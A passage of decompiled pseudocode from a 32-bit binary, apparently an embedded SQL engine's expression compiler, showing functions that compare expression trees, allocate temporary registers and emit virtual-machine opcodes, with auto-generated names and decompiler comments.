        while ( 1 )
        {
          ++a1[21];
          if ( v68 )
            v87 = *v14;
          else
            v64 = (unsigned __int8 *)*v14;
          v80 = sub_1005AC63((int)v4);
          sub_100783F1(a1, v64, v80, 8);
          sub_10077F49(*(_DWORD *)(v56 + 20));
          sub_1005ABE8((int)v4, 1, 0, v59);
          sub_100772D1((int)a1);
          sub_1005ACAF((int)v4, v80);
          v56 += 40;
          v82 = (int *)((char *)v82 - 1);
          if ( !v82 )
            break;
          v14 = (int *)v56;
        }
      }
      if ( *((_DWORD *)a2 + 3) )
      {
        ++a1[21];
        sub_10077F49(*((_DWORD *)a2 + 3));
        sub_100772D1((int)a1);
      }
      else
      {
        sub_1005ABE8((int)v4, 10, 0, a3);
      }
LABEL_128:
      v22 = (int)v54;
      v21 = v59;
      goto LABEL_129;
    }
    if ( *a2 >= 0x4Bu )
    {
      v74 = sub_10077F0E(&v81, (int)a1, *((_DWORD *)a2 + 2));
      v52 = sub_10077F0E(&v83, (int)a1, *((_DWORD *)a2 + 3));
      sub_10075ACC(*((unsigned __int8 **)a2 + 3), (int)a1, *((unsigned __int8 **)a2 + 2), v7, v74, v52, a3, 16);
    }
    else if ( v7 == 71 )
    {
      v23 = *(unsigned __int8 ***)(*((_DWORD *)a2 + 4) + 12);
      v60 = (unsigned __int8 *)*((_DWORD *)a2 + 2);
      v70 = *v23;
      v73 = sub_10077F0E(&v81, (int)a1, (int)v60);
      sub_10077F0E(&v83, (int)a1, (int)v70);
      v57 = sub_10078A55((int)a1);
      v65 = sub_10078A55((int)a1);
      sub_10075ACC(v70, (int)a1, v60, 80, v73, v24, v57, 16);
      v25 = v23[5];
      sub_10078A70((int)a1, v83);
      v26 = sub_10077F0E(&v83, (int)a1, (int)v25);
      sub_10075ACC(v25, (int)a1, v60, 78, v73, v26, v65, 16);
      sub_1005AB66((int)v4, 69, v57, v65, a3);
      v27 = sub_10078A70((int)a1, v57);
      sub_10078A70(v27, v65);
    }
    else
    {
      if ( v7 == 72 )
      {
        v20 = sub_1005AC63((int)v4);
        v69 = sub_1005AC63((int)v4);
        sub_1005ABE8((int)v4, 10, 0, a3);
        sub_10076F92(a1, (int)a2, v20, v69);
        sub_1005ABE8((int)v4, 7, 1, a3);
        sub_1005ACAF((int)v4, v20);
        sub_1005ABE8((int)v4, 20, a3, 0);
        v21 = v69;
        v22 = (int)v4;
LABEL_129:
        sub_1005ACAF(v22, v21);
        goto LABEL_130;
      }
      if ( *a2 <= 0x48u || *a2 > 0x4Au )
        goto LABEL_21;
      sub_1005ABE8((int)v4, 7, 1, a3);
      v18 = sub_10077F0E(&v81, (int)a1, *((_DWORD *)a2 + 2));
      v19 = sub_1005ABD1((int)v4, v7, v18);
      sub_1005ABE8((int)v4, 20, a3, -1);
      sub_1005AE20(v19, (int)v4);
    }
  }
  else
  {
    if ( v7 == 70 )
    {
LABEL_75:
      v76 = sub_10077F0E(&v81, (int)a1, *((_DWORD *)a2 + 2));
      v53 = sub_10077F0E(&v83, (int)a1, *((_DWORD *)a2 + 3));
      sub_10075ACC(
        *((unsigned __int8 **)a2 + 3),
        (int)a1,
        *((unsigned __int8 **)a2 + 2),
        (v7 == 70) + 75,
        v76,
        v53,
        a3,
        144);
      goto LABEL_130;
    }
    if ( *a2 <= 0x25u )
    {
      if ( v7 == 37 )
      {
        v63 = sub_10077418(a1, *((_DWORD *)a2 + 2), a3);
        v10 = sub_1006A7EB(v9, *((_BYTE **)a2 + 1)) + 44;
        if ( v63 != a3 )
        {
          sub_1005ABE8((int)v4, 15, v63, a3);
          v63 = a3;
        }
        sub_1005ABD1((int)v4, v10, v63);
        sub_100772A8((int)a1, 1, v63);
        goto LABEL_130;
      }
      if ( v7 != 19 )
      {
        if ( v7 == 20 )
        {
LABEL_119:
          v8 = sub_10076C71(a1, (int)a2, 0, 0);
          goto LABEL_57;
        }
        if ( v7 == 24 )
        {
LABEL_13:
          v8 = sub_10077418(a1, *((_DWORD *)a2 + 2), a3);
LABEL_57:
          v63 = v8;
          goto LABEL_130;
        }
        goto LABEL_21;
      }
      goto LABEL_51;
    }
    if ( v7 != 56 )
    {
      if ( v7 == 60 )
      {
        v15 = *((_DWORD *)a2 + 10);
        sub_1005ABE8((int)v4, 108, *((_DWORD *)a2 + 6) * (*(_DWORD *)(v15 + 12) + 1) + *((__int16 *)a2 + 14) + 1, a3);
        v16 = *((_WORD *)a2 + 14);
        if ( v16 >= 0 && *(_BYTE *)(24 * v16 + *(_DWORD *)(v15 + 16) + 22) == 101 )
          sub_1005ABD1((int)v4, 22, a3);
        goto LABEL_130;
      }
      if ( *a2 <= 0x43u || *a2 > 0x45u )
        goto LABEL_21;
LABEL_52:
      v75 = sub_10077F0E(&v81, (int)a1, *((_DWORD *)a2 + 2));
      v29 = sub_10077F0E(&v83, (int)a1, *((_DWORD *)a2 + 3));
      sub_1005AB66((int)v4, v7, v29, v75, a3);
      goto LABEL_130;
    }
    if ( !a1[107] )
    {
      sub_10059320(a1, aRaiseMayOnlyBe);
      return 0;
    }
    if ( a2[1] == 2 )
      sub_1006CB6D(a1);
    v17 = a2[1];
    if ( v17 == 4 )
      sub_1005AC02(v4, 6, 0, 4, 0, *((unsigned __int16 **)a2 + 1), 0);
    else
      sub_1006CB81(v3, v17, *((unsigned __int16 **)a2 + 1), 0);
  }
LABEL_130:
  v51 = sub_10078A70((int)a1, v81);
  sub_10078A70(v51, v83);
  return v63;
}
// 100774D0: variable 'v9' is possibly undefined
// 10077664: variable 'v3' is possibly undefined
// 100777BA: variable 'v24' is possibly undefined
// 10077C80: variable 'v46' is possibly undefined
// 10077F49: using guessed type _DWORD __cdecl sub_10077F49(_DWORD);

//----- (10077F0E) --------------------------------------------------------
int __usercall sub_10077F0E@<eax>(int *a1@<edi>, int a2, int a3)
{
  int v3; // esi
  int v4; // ebx

  v3 = sub_10078A55(a2);
  v4 = sub_10077418(a2, a3, v3);
  if ( v4 == v3 )
  {
    *a1 = v3;
  }
  else
  {
    sub_10078A70(a2, v3);
    *a1 = 0;
  }
  return v4;
}
// 10077418: using guessed type _DWORD __cdecl sub_10077418(_DWORD, _DWORD, _DWORD);

//----- (10077F49) --------------------------------------------------------
int __usercall sub_10077F49@<eax>(int *a1@<edi>, int a2@<esi>, unsigned __int8 *a3)
{
  int v3; // ecx
  int v4; // eax
  int v6; // [esp+0h] [ebp-8h]

  v3 = sub_10077418(a1, a3, v6);
  if ( v3 != a2 )
  {
    v4 = a1[3];
    if ( v4 )
      sub_1005ABE8(v4, 15, v3, a2);
  }
  return a2;
}
// 10077F52: variable 'v6' is possibly undefined

//----- (10077F78) --------------------------------------------------------
int __cdecl sub_10077F78(int a1, unsigned __int8 *a2)
{
  int *v2; // ebx
  int *v3; // eax
  int v4; // edx
  int v5; // eax
  unsigned __int8 *v6; // edi
  unsigned __int8 v7; // al
  char v8; // al
  int v9; // edi
  int v10; // ebx
  int v12; // [esp+14h] [ebp+8h]

  v2 = *(int **)(a1 + 8);
  v12 = (int)v2;
  if ( *a2 == 72 || *a2 == 132 )
    return 1;
  if ( *a2 == 151 || *a2 == 153 || *a2 == 155 )
  {
    v3 = (int *)*((_DWORD *)a2 + 4);
    if ( v3 )
    {
      v4 = *v3;
      v5 = v3[3];
      while ( v4 > 0 )
      {
        if ( *(_DWORD *)v5 )
          *(_WORD *)(*(_DWORD *)v5 + 2) |= 0x200u;
        --v4;
        v5 += 20;
      }
    }
  }
  v6 = a2;
  sub_10076851((int)a2);
  if ( (*((_WORD *)a2 + 1) & 0x200) == 0 )
    goto LABEL_23;
  if ( *a2 == 0x9D )
  {
    do
      v6 = (unsigned __int8 *)*((_DWORD *)v6 + 2);
    while ( *v6 == 0x9D );
  }
  v7 = *v6;
  if ( *v6 != 94 && v7 != 98 )
  {
    if ( v7 <= 0x80u
      || v7 > 0x83u && v7 != 0x85 && (v7 != 0x9C || (v8 = **((_BYTE **)v6 + 2), v8 != -126) && v8 != -127) )
    {
LABEL_23:
      v9 = ++v2[18];
      v10 = sub_10077418(v2, a2, v9);
      if ( v9 != v10 )
        sub_10078A70(v12, v9);
      a2[35] = *a2;
      *a2 = -124;
      *((_DWORD *)a2 + 6) = v10;
      return 1;
    }
  }
  return 0;
}

//----- (10078052) --------------------------------------------------------
int __usercall sub_10078052@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, int a4)
{
  _DWORD *v4; // ebx
  int v6; // ecx
  int v7; // esi
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int v10; // ecx
  int v12; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]

  v4 = (_DWORD *)a1[3];
  v6 = *a1;
  v12 = *a1;
  if ( *a1 > 0 )
  {
    v14 = a3;
    v13 = *a1;
    do
    {
      if ( *((_WORD *)v4 + 8) )
      {
        v7 = sub_10077418(a2, *v4, v14);
        v8 = sub_1007C271((int *)a2);
        if ( v7 != v14 )
          sub_1005ABE8((int)v8, 15, v7, v14);
      }
      else
      {
        sub_10077F49(*v4);
      }
      if ( a4 )
      {
        if ( !*(_BYTE *)(*(_DWORD *)a2 + 30) )
        {
          v9 = sub_1005B0D5(-1, *(_DWORD **)(a2 + 12));
          if ( *(_BYTE *)v9 == 15 )
          {
            v10 = v9[1];
            if ( v10 >= a3 && v10 < a3 + v12 )
              *(_BYTE *)v9 = 14;
          }
        }
      }
      ++v14;
      v4 += 5;
      --v13;
    }
    while ( v13 );
    return v12;
  }
  return v6;
}
// 10077418: using guessed type _DWORD __cdecl sub_10077418(_DWORD, _DWORD, _DWORD);
// 10077F49: using guessed type _DWORD __cdecl sub_10077F49(_DWORD);

//----- (100780FC) --------------------------------------------------------
int __usercall sub_100780FC@<eax>(int a1@<eax>, int *a2@<ebx>, int a3, int a4, int a5)
{
  const void *v5; // esi
  int v6; // eax
  char v8; // [esp+Ch] [ebp-C8h] BYREF
  int *v9; // [esp+14h] [ebp-C0h]
  int v10; // [esp+18h] [ebp-BCh]
  char v11; // [esp+3Ch] [ebp-98h] BYREF
  int *v12; // [esp+44h] [ebp-90h]
  int v13; // [esp+48h] [ebp-8Ch]
  unsigned __int8 v14[8]; // [esp+6Ch] [ebp-68h] BYREF
  char *v15; // [esp+74h] [ebp-60h]
  char *v16; // [esp+78h] [ebp-5Ch]
  int v17[12]; // [esp+9Ch] [ebp-38h] BYREF
  int v18; // [esp+CCh] [ebp-8h] BYREF

  v5 = *(const void **)(a1 + 8);
  v6 = *(_DWORD *)(a1 + 16);
  v18 = 0;
  qmemcpy(v17, v5, sizeof(v17));
  v15 = &v11;
  v16 = &v8;
  v14[0] = 69;
  v11 = 80;
  v12 = v17;
  v13 = **(_DWORD **)(v6 + 12);
  v8 = 78;
  v9 = v17;
  v10 = *(_DWORD *)(*(_DWORD *)(v6 + 12) + 20);
  v17[6] = sub_10077F0E(&v18, (int)a2, (int)v17);
  LOBYTE(v17[0]) = -124;
  if ( a4 )
    sub_100781A9(a2, v14, a3, a5);
  else
    sub_100783F1(a2, v14, a3, a5);
  return sub_10078A70((int)a2, v18);
}
// 100783F1: using guessed type _DWORD __cdecl sub_100783F1(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (100781A9) --------------------------------------------------------
void __cdecl sub_100781A9(int *a1, unsigned __int8 *a2, int a3, int a4)
{
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // [esp-1Ch] [ebp-3Ch]
  int v17; // [esp-1Ch] [ebp-3Ch]
  int v18; // [esp-Ch] [ebp-2Ch]
  int v19; // [esp-Ch] [ebp-2Ch]
  int v20; // [esp-Ch] [ebp-2Ch]
  int v21; // [esp+10h] [ebp-10h] BYREF
  int v22; // [esp+14h] [ebp-Ch]
  int v23; // [esp+18h] [ebp-8h]
  int v24; // [esp+1Ch] [ebp-4h] BYREF

  v21 = 0;
  v24 = 0;
  v22 = a1[3];
  v4 = v22;
  if ( v22 && a2 )
  {
    v5 = *a2;
    v23 = v5;
    if ( v5 > 71 )
    {
      if ( v5 == 72 )
      {
        v14 = sub_1005AC63(v22);
        v23 = v14;
        if ( a4 )
          v14 = a3;
        sub_10076F92(a1, (int)a2, v23, v14);
        sub_1005ABE8(v22, 1, 0, a3);
        sub_1005ACAF(v22, v23);
        goto LABEL_24;
      }
      if ( v5 <= 74 )
      {
        v13 = sub_10077F0E(&v21, (int)a1, *((_DWORD *)a2 + 2));
        sub_1005ABE8(v22, v23, v13, a3);
        goto LABEL_24;
      }
      if ( v5 <= 80 )
      {
        v12 = sub_10077F0E(&v21, (int)a1, *((_DWORD *)a2 + 2));
        v20 = *((_DWORD *)a2 + 3);
        v22 = v12;
        v17 = sub_10077F0E(&v24, (int)a1, v20);
        sub_10075ACC(*((unsigned __int8 **)a2 + 3), (int)a1, *((unsigned __int8 **)a2 + 2), v23, v22, v17, a3, a4);
        goto LABEL_24;
      }
      if ( v5 != 146 )
        goto LABEL_9;
    }
    else
    {
      if ( v5 == 71 )
      {
        sub_100780FC(a3, 1, a4);
        goto LABEL_24;
      }
      v6 = v5 - 19;
      if ( !v6 )
      {
        sub_100783F1(a1, *((_DWORD *)a2 + 2), a3, a4);
        goto LABEL_24;
      }
      v7 = v6 - 49;
      if ( !v7 )
      {
        sub_100781A9(a1, *((_DWORD *)a2 + 2), a3, a4);
        sub_100781A9(a1, *((_DWORD *)a2 + 3), a3, a4);
        goto LABEL_24;
      }
      v8 = v7 - 1;
      if ( !v8 )
      {
        v10 = sub_1005AC63(v22);
        ++a1[21];
        v18 = *((_DWORD *)a2 + 2);
        v23 = v10;
        sub_100783F1(a1, v18, v10, a4 ^ 8);
        sub_100781A9(a1, *((_DWORD *)a2 + 3), a3, a4);
        sub_1005ACAF(v4, v23);
        sub_100772D1((int)a1);
        goto LABEL_24;
      }
      if ( v8 != 1 )
      {
LABEL_9:
        v9 = sub_10077F0E(&v21, (int)a1, (int)a2);
        sub_1005AB66(v22, 26, v9, a3, a4 != 0);
LABEL_24:
        v15 = sub_10078A70((int)a1, v21);
        sub_10078A70(v15, v24);
        return;
      }
    }
    v11 = sub_10077F0E(&v21, (int)a1, *((_DWORD *)a2 + 2));
    v19 = *((_DWORD *)a2 + 3);
    v22 = v11;
    v16 = sub_10077F0E(&v24, (int)a1, v19);
    sub_10075ACC(
      *((unsigned __int8 **)a2 + 3),
      (int)a1,
      *((unsigned __int8 **)a2 + 2),
      (v23 == 70) + 75,
      v22,
      v16,
      a3,
      128);
    goto LABEL_24;
  }
}
// 100782DA: conditional instruction was optimized away because eax.4 is in (49..FF)
// 100780FC: using guessed type _DWORD __cdecl sub_100780FC(_DWORD, _DWORD, _DWORD);
// 100783F1: using guessed type _DWORD __cdecl sub_100783F1(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (100783F1) --------------------------------------------------------
void __cdecl sub_100783F1(int *a1, unsigned __int8 *a2, int a3, int a4)
{
  int v4; // edi
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // [esp-1Ch] [ebp-3Ch]
  int v16; // [esp-1Ch] [ebp-3Ch]
  unsigned __int8 *v17; // [esp-Ch] [ebp-2Ch]
  int v18; // [esp-Ch] [ebp-2Ch]
  int v19; // [esp-Ch] [ebp-2Ch]
  int v20; // [esp+10h] [ebp-10h] BYREF
  int v21; // [esp+14h] [ebp-Ch]
  int v22; // [esp+18h] [ebp-8h] BYREF
  int v23; // [esp+1Ch] [ebp-4h]

  v21 = a1[3];
  v4 = v21;
  v20 = 0;
  v22 = 0;
  if ( v21 && a2 )
  {
    v5 = *a2;
    v23 = ((v5 + 1) ^ 1) - 1;
    if ( v5 > 71 )
    {
      if ( v5 == 72 )
      {
        if ( a4 )
        {
          sub_10076F92(a1, (int)a2, a3, a3);
        }
        else
        {
          v23 = sub_1005AC63(v21);
          sub_10076F92(a1, (int)a2, a3, v23);
          sub_1005ACAF(v21, v23);
        }
        goto LABEL_24;
      }
      if ( v5 <= 74 )
      {
        v13 = sub_10077F0E(&v20, (int)a1, *((_DWORD *)a2 + 2));
        sub_1005ABE8(v21, v23, v13, a3);
        goto LABEL_24;
      }
      if ( v5 <= 80 )
      {
        v12 = sub_10077F0E(&v20, (int)a1, *((_DWORD *)a2 + 2));
        v19 = *((_DWORD *)a2 + 3);
        v21 = v12;
        v16 = sub_10077F0E(&v22, (int)a1, v19);
        sub_10075ACC(*((unsigned __int8 **)a2 + 3), (int)a1, *((unsigned __int8 **)a2 + 2), v23, v21, v16, a3, a4);
        goto LABEL_24;
      }
      if ( v5 != 146 )
        goto LABEL_9;
    }
    else
    {
      if ( v5 == 71 )
      {
        sub_100780FC((int)a2, a1, a3, 0, a4);
        goto LABEL_24;
      }
      v6 = v5 - 19;
      if ( !v6 )
      {
        sub_100781A9(a1, *((unsigned __int8 **)a2 + 2), a3, a4);
        goto LABEL_24;
      }
      v7 = v6 - 49;
      if ( !v7 )
      {
        v10 = sub_1005AC63(v21);
        ++a1[21];
        v17 = (unsigned __int8 *)*((_DWORD *)a2 + 2);
        v23 = v10;
        sub_100781A9(a1, v17, v10, a4 ^ 8);
        sub_100783F1(a1, *((_DWORD *)a2 + 3), a3, a4);
        sub_1005ACAF(v4, v23);
        sub_100772D1((int)a1);
        goto LABEL_24;
      }
      v8 = v7 - 1;
      if ( !v8 )
      {
        sub_100783F1(a1, *((_DWORD *)a2 + 2), a3, a4);
        sub_100783F1(a1, *((_DWORD *)a2 + 3), a3, a4);
        goto LABEL_24;
      }
      if ( v8 != 1 )
      {
LABEL_9:
        v9 = sub_10077F0E(&v20, (int)a1, (int)a2);
        sub_1005AB66(v21, 27, v9, a3, a4 != 0);
LABEL_24:
        v14 = sub_10078A70((int)a1, v20);
        sub_10078A70(v14, v22);
        return;
      }
    }
    v11 = sub_10077F0E(&v20, (int)a1, *((_DWORD *)a2 + 2));
    v18 = *((_DWORD *)a2 + 3);
    v21 = v11;
    v15 = sub_10077F0E(&v22, (int)a1, v18);
    sub_10075ACC(
      *((unsigned __int8 **)a2 + 3),
      (int)a1,
      *((unsigned __int8 **)a2 + 2),
      (*a2 != 70) + 75,
      v21,
      v15,
      a3,
      128);
    goto LABEL_24;
  }
}
// 10078525: conditional instruction was optimized away because ecx.4 is in (49..FF)

//----- (10078638) --------------------------------------------------------
BOOL __cdecl sub_10078638(int a1, int a2)
{
  int v3; // ebx
  __int16 v4; // cx
  __int16 v5; // ax
  int *v6; // eax
  _DWORD *v7; // edx
  unsigned __int8 *v9; // edi
  unsigned __int8 *v10; // esi
  int v11; // [esp+14h] [ebp+8h]

  v3 = 0;
  if ( !a1 || !a2 )
    return a2 == a1;
  v4 = *(_WORD *)(a1 + 2);
  if ( (v4 & 0x800) != 0 )
    return 0;
  v5 = *(_WORD *)(a2 + 2);
  if ( (v5 & 0x800) != 0
    || (((unsigned __int8)v4 ^ (unsigned __int8)v5) & 0x10) != 0
    || *(_BYTE *)a1 != *(_BYTE *)a2
    || !sub_10078638(*(_DWORD *)(a1 + 8), *(_DWORD *)(a2 + 8))
    || !sub_10078638(*(_DWORD *)(a1 + 12), *(_DWORD *)(a2 + 12)) )
  {
    return 0;
  }
  v6 = *(int **)(a1 + 16);
  if ( v6 )
  {
    v7 = *(_DWORD **)(a2 + 16);
    if ( !v7 || *v6 != *v7 )
      return 0;
    v11 = 0;
    if ( *v6 > 0 )
    {
      while ( sub_10078638(*(_DWORD *)(v3 + v6[3]), *(_DWORD *)(v3 + *(_DWORD *)(*(_DWORD *)(a2 + 16) + 12))) )
      {
        ++v11;
        v6 = *(int **)(a1 + 16);
        v3 += 20;
        if ( v11 >= *v6 )
          goto LABEL_18;
      }
      return 0;
    }
  }
  else if ( *(_DWORD *)(a2 + 16) )
  {
    return 0;
  }
LABEL_18:
  if ( *(_DWORD *)(a1 + 24) != *(_DWORD *)(a2 + 24) || *(_WORD *)(a1 + 28) != *(_WORD *)(a2 + 28) )
    return 0;
  if ( (*(_WORD *)(a1 + 2) & 0x400) != 0 )
  {
    if ( (*(_WORD *)(a2 + 2) & 0x400) == 0 || *(_DWORD *)(a1 + 4) != *(_DWORD *)(a2 + 4) )
      return 0;
  }
  else if ( *(_BYTE *)a1 != 0x98 )
  {
    v9 = *(unsigned __int8 **)(a1 + 4);
    if ( v9 )
    {
      if ( (*(_WORD *)(a2 + 2) & 0x400) != 0 )
        return 0;
      v10 = *(unsigned __int8 **)(a2 + 4);
      if ( !v10 || sub_100593BE(v9, v10) )
        return 0;
    }
  }
  return 1;
}
// 100786F7: conditional instruction was optimized away because eax.4!=0

//----- (10078764) --------------------------------------------------------
int __cdecl sub_10078764(int a1, unsigned __int8 *a2)
{
  int v2; // edx
  int v3; // eax
  __int16 *v4; // ecx
  int *v5; // ebx
  _DWORD *v6; // edi
  int *v8; // eax
  int *v9; // esi
  _DWORD *v10; // eax
  unsigned __int8 *v11; // esi
  _DWORD *v12; // edi
  int *v13; // eax
  _BYTE *v14; // eax
  unsigned __int8 *v15; // edx
  int v16; // eax
  int v17; // eax
  _DWORD *i; // ecx
  _DWORD *v19; // eax
  int *v20; // ecx
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  unsigned __int8 *v24; // ecx
  int v25; // ebx
  int *v26; // edx
  _DWORD *v27; // edi
  int v28; // edx
  _BYTE *v29; // esi
  char v30; // [esp+Ch] [ebp-Ch]
  int v31; // [esp+Ch] [ebp-Ch]
  _DWORD *v32; // [esp+Ch] [ebp-Ch]
  int *v33; // [esp+10h] [ebp-8h]
  int v34; // [esp+10h] [ebp-8h]
  int v35; // [esp+10h] [ebp-8h]
  _DWORD *v36; // [esp+14h] [ebp-4h]

  v2 = (int)a2;
  v3 = *(_DWORD *)(a1 + 12);
  v4 = *(__int16 **)(v3 + 4);
  v5 = *(int **)v3;
  v6 = *(_DWORD **)(v3 + 28);
  v36 = v6;
  if ( *a2 != 152 )
  {
    if ( *a2 == 153 )
    {
      if ( *(_DWORD *)(v3 + 24) )
        return 0;
      v8 = (int *)v6[8];
      a1 = 0;
      v9 = v6 + 9;
      v33 = v8;
      if ( (int)v6[9] > 0 )
      {
        while ( !sub_10078638(*v33, v2) )
        {
          ++a1;
          v33 += 4;
          if ( a1 >= *v9 )
            break;
          v2 = (int)a2;
        }
        v2 = (int)a2;
      }
      if ( a1 >= *v9 )
      {
        v30 = *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(*v5 + 8) + 12) + 73);
        v10 = sub_1006C503((_DWORD *)v6[8], 3, v6 + 10, v9, *v5, 16, &a1);
        v6[8] = v10;
        if ( a1 < 0 )
        {
          v2 = (int)a2;
        }
        else
        {
          v11 = a2;
          v12 = &v10[4 * a1];
          *v12 = a2;
          v12[2] = ++v5[18];
          v13 = (int *)*((_DWORD *)v11 + 4);
          if ( v13 )
            v34 = *v13;
          else
            v34 = 0;
          v14 = sub_10059297(*((_BYTE **)v11 + 1));
          v12[1] = sub_100697AC((size_t)v14, v34, *v5, v15, v30, 0);
          v2 = (int)v11;
          if ( (v11[2] & 0x10) != 0 )
            v12[3] = v5[17]++;
          else
            v12[3] = -1;
        }
        v6 = v36;
      }
      goto LABEL_48;
    }
    if ( *a2 != 154 )
      return 0;
  }
  if ( !v4 )
    return 1;
  v16 = *v4;
  a1 = 0;
  v31 = v16;
  if ( v16 <= 0 )
    return 1;
  v17 = *((_DWORD *)a2 + 6);
  for ( i = v4 + 16; v17 != *i; i += 14 )
  {
    if ( ++a1 >= v31 )
      return 1;
  }
  v19 = (_DWORD *)v6[4];
  a1 = 0;
  v20 = v6 + 5;
  v32 = v19;
  if ( (int)v6[5] > 0 )
  {
    v21 = v19 + 2;
    do
    {
      if ( *(v21 - 1) == *((_DWORD *)a2 + 6) && *v21 == *((__int16 *)a2 + 14) )
        break;
      ++a1;
      v21 += 6;
    }
    while ( a1 < *v20 );
  }
  if ( a1 >= *v20 )
  {
    v22 = sub_1006C503(v32, 3, v6 + 6, v6 + 5, *v5, 24, &a1);
    v6[4] = v22;
    if ( a1 < 0 )
      goto LABEL_45;
    v23 = &v22[6 * a1];
    v24 = a2;
    *v23 = *((_DWORD *)a2 + 10);
    v23[1] = *((_DWORD *)v24 + 6);
    v23[2] = *((__int16 *)v24 + 14);
    v25 = ++v5[18];
    v23[3] = -1;
    v23[4] = v25;
    v23[5] = v24;
    v26 = (int *)v6[2];
    if ( v26 )
    {
      v27 = (_DWORD *)v26[3];
      v28 = *v26;
      v35 = 0;
      if ( v28 > 0 )
      {
        while ( 1 )
        {
          v29 = (_BYTE *)*v27;
          if ( *(_BYTE *)*v27 == 0x98
            && *((_DWORD *)v29 + 6) == *((_DWORD *)v24 + 6)
            && *((_WORD *)v29 + 14) == *((_WORD *)v24 + 14) )
          {
            break;
          }
          ++v35;
          v27 += 5;
          if ( v35 >= v28 )
            goto LABEL_43;
        }
        v23[3] = v35;
      }
    }
LABEL_43:
    if ( (int)v23[3] >= 0 )
    {
LABEL_45:
      v6 = v36;
    }
    else
    {
      v23[3] = v36[3]++;
      v6 = v36;
    }
    v2 = (int)a2;
  }
  *(_BYTE *)v2 = -102;
LABEL_48:
  *(_WORD *)(v2 + 30) = a1;
  *(_DWORD *)(v2 + 36) = v6;
  return 1;
}
// 10078862: variable 'v15' is possibly undefined

//----- (100789D6) --------------------------------------------------------
int __cdecl sub_100789D6(int a1, int a2)
{
  int v2; // esi

  v2 = *(_DWORD *)(a1 + 12);
  if ( *(_DWORD *)(v2 + 24) )
    return 0;
  *(_DWORD *)(v2 + 24) = 1;
  sub_10085024(a1, a2);
  --*(_DWORD *)(v2 + 24);
  return 1;
}

//----- (10078A05) --------------------------------------------------------
int __usercall sub_10078A05@<eax>(int (__cdecl *a1)(_DWORD, int)@<eax>, int a2)
{
  int (__cdecl *v3[4])(_DWORD, int); // [esp+0h] [ebp-10h] BYREF

  v3[3] = a1;
  v3[0] = (int (__cdecl *)(_DWORD, int))sub_10078764;
  v3[1] = sub_100789D6;
  return sub_10084F0D(v3, a2);
}

//----- (10078A2C) --------------------------------------------------------
int __usercall sub_10078A2C@<eax>(int *a1@<esi>, int (__cdecl *a2)(_DWORD, int))
{
  int v2; // ebx
  int *v3; // edi
  int result; // eax

  v2 = 0;
  if ( a1 )
  {
    v3 = (int *)a1[3];
    if ( *a1 > 0 )
    {
      do
      {
        result = sub_10078A05(a2, *v3);
        ++v2;
        v3 += 5;
      }
      while ( v2 < *a1 );
    }
  }
  return result;
}

//----- (10078A55) --------------------------------------------------------
int __usercall sub_10078A55@<eax>(int a1@<eax>)
{
  char v1; // cl
  unsigned __int8 v3; // cl

  v1 = *(_BYTE *)(a1 + 21);
  if ( v1 )
  {
    v3 = v1 - 1;
    *(_BYTE *)(a1 + 21) = v3;
    return *(_DWORD *)(a1 + 4 * v3 + 24);
  }
  else
  {
    return ++*(_DWORD *)(a1 + 72);
  }
}

//----- (10078A70) --------------------------------------------------------
int __usercall sub_10078A70@<eax>(int result@<eax>, int a2@<edx>)
{
  unsigned __int8 v2; // bl
  int v3; // esi
  int i; // ecx

  if ( a2 )
  {
    v2 = *(_BYTE *)(result + 21);
    if ( v2 < 8u )
    {
      v3 = 0;
      for ( i = result + 96; *(_DWORD *)(i + 16) != a2; i += 24 )
      {
        if ( ++v3 >= 10 )
        {
          *(_DWORD *)(result + 4 * v2 + 24) = a2;
          ++*(_BYTE *)(result + 21);
          return result;
        }
      }
      *(_BYTE *)(i + 8) = 1;
    }
  }
  return result;
}

//----- (10078AA4) --------------------------------------------------------
int __usercall sub_10078AA4@<eax>(_DWORD *a1@<ecx>, int a2@<esi>)
{
  int v2; // edx
  int result; // eax
  int v4; // edx

  v2 = a1[14];
  result = a1[15];
  if ( a2 > v2 )
  {
    v4 = a1[18];
    result = v4 + 1;
    a1[18] = a2 + v4;
  }
  else
  {
    a1[15] = result + a2;
    a1[14] = v2 - a2;
  }
  return result;
}

//----- (10078AC8) --------------------------------------------------------
int __usercall sub_10078AC8@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<edi>)
{
  int result; // eax

  result = sub_100772A8(a1, a3, a2);
  if ( a3 > *(_DWORD *)(result + 56) )
  {
    *(_DWORD *)(result + 56) = a3;
    *(_DWORD *)(result + 60) = a2;
  }
  return result;
}

//----- (10078ADF) --------------------------------------------------------
BOOL __usercall sub_10078ADF@<eax>(_BYTE *a1@<eax>, int a2@<ecx>)
{
  BOOL v3; // ebx

  v3 = 0;
  if ( a1 )
  {
    if ( *a1 == 26 )
    {
      *a1 = 94;
    }
    else
    {
      v3 = sub_1008003C((int)a1, a2);
      if ( !v3 )
        sub_10076851((int)a1);
    }
  }
  return v3;
}

//----- (10078B27) --------------------------------------------------------
_DWORD *__cdecl sub_10078B27(int a1, int a2, int *Src)
{
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  int v6; // edi
  _BYTE *v7; // eax
  void *v8; // eax
  _DWORD *result; // eax
  _DWORD *v10; // ebx
  int v11; // eax
  int *v12; // ebx
  int v13; // eax
  _DWORD *v14; // eax
  int v15; // edi
  int v16; // edi
  int v17; // ebx
  int v18; // eax
  int v19; // edi
  bool v20; // zf
  char *v21; // eax
  int v22; // [esp-4h] [ebp-20h]
  unsigned __int8 **v23; // [esp+Ch] [ebp-10h]
  char *v24; // [esp+10h] [ebp-Ch]
  int v25; // [esp+14h] [ebp-8h]
  _BYTE *v26; // [esp+18h] [ebp-4h] BYREF
  unsigned __int8 *Srca; // [esp+2Ch] [ebp+10h]

